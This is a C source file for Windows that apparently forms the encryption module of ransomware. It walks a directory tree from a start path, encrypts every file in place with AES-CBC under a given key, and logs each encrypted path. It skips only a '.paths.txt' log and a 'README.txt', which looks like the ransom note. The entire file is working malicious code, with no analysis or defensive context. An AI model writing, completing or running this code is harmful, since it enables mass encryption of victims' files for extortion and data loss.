#include "encrypt.h"
#include "aes.h"
#include "files.h"
#include "common.h"

typedef struct {
    char **paths;
    size_t capacity;
    size_t size;
} PathStack;

static int path_stack_push(PathStack *stack, const char *path) {
    if (!stack || !path)
        return ERR_INVALID_ARG;

    int err = ERR_SUCCESS;
    if (stack->size >= stack->capacity) {
        size_t new_capacity = stack->capacity * 2;
        if (new_capacity == 0)
            new_capacity = 16;
        char **new_paths = realloc(stack->paths, new_capacity * sizeof(char*));
        if (!new_paths) {
            err = ERR_MEMORY_ALLOC;
            return err;
        }
        stack->paths = new_paths;
        stack->capacity = new_capacity;
    }
    stack->paths[stack->size] = _strdup(path);
    if (!stack->paths[stack->size]) {
        err = ERR_MEMORY_ALLOC;
        return err;
    }
    stack->size++;
    return err;
}

static char* path_stack_pop(PathStack *stack) {
    if (!stack || stack->size == 0)
        return NULL;
    char *path = stack->paths[--stack->size];
    return path;
}

static void path_stack_free(PathStack *stack) {
    if (!stack)
        return;
    for (size_t i = 0; i < stack->size; i++) {
        if (stack->paths[i])
            free(stack->paths[i]);
    }
    free(stack->paths);
    stack->paths = NULL;
    stack->size = 0;
    stack->capacity = 0;
}

int encrypt(const char *filepath, const unsigned char *key) {
    int err = ERR_SUCCESS;
    if (!filepath || !key) {
        err = ERR_INVALID_ARG;
        return err;
    }
    return encrypt_file_aes_cbc(filepath, key);
}

int enumerate(const char *start_path, const unsigned char *key) {
    int err = ERR_SUCCESS;
    if (!start_path || !key) {
        err = ERR_INVALID_ARG;
        return err;
    }
    PathStack stack = { .paths = NULL, .capacity = 0, .size = 0 };
    if (path_stack_push(&stack, start_path) != ERR_SUCCESS) {
        path_stack_free(&stack);
        err = ERR_MEMORY_ALLOC;
        return err;
    }
    while (stack.size > 0) {
        char *path = path_stack_pop(&stack);
        if (!path)
            continue;
        WIN32_FIND_DATAA find_data;
        HANDLE h_find = INVALID_HANDLE_VALUE;
        char dir_spec[MAX_PATH] = {0};
        if (_snprintf_s(dir_spec, sizeof(dir_spec), _TRUNCATE, "%s\\*", path) == -1) {
            free(path);
            continue;
        }
        h_find = FindFirstFileA(dir_spec, &find_data);
        if (h_find == INVALID_HANDLE_VALUE) {
            free(path);
            continue;
        }
        do {
            if (strcmp(find_data.cFileName, ".") == 0 || strcmp(find_data.cFileName, "..") == 0) {
                continue;
            }
            char full_path[MAX_PATH] = {0};
            if (_snprintf_s(full_path, sizeof(full_path), _TRUNCATE, "%s\\%s", path, find_data.cFileName) == -1) {
                continue;
            }
            if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                if (path_stack_push(&stack, full_path) != ERR_SUCCESS) {
                    path_stack_free(&stack);
                    FindClose(h_find);
                    free(path);
                    err = ERR_MEMORY_ALLOC;
                    return err;
                }
            } else {
                const char *basename = strrchr(full_path, '\\');
                basename = basename ? basename + 1 : full_path;
                if (strcmp(basename, ".paths.txt") != 0 && strcmp(basename, "README.txt") != 0) {
                    if (encrypt(full_path, key) == ERR_SUCCESS) {
                        append_to_paths(full_path);
                    }
                }
            }
        } while (FindNextFileA(h_find, &find_data));
        FindClose(h_find);
        free(path);
    }
    path_stack_free(&stack);
    return err;
}
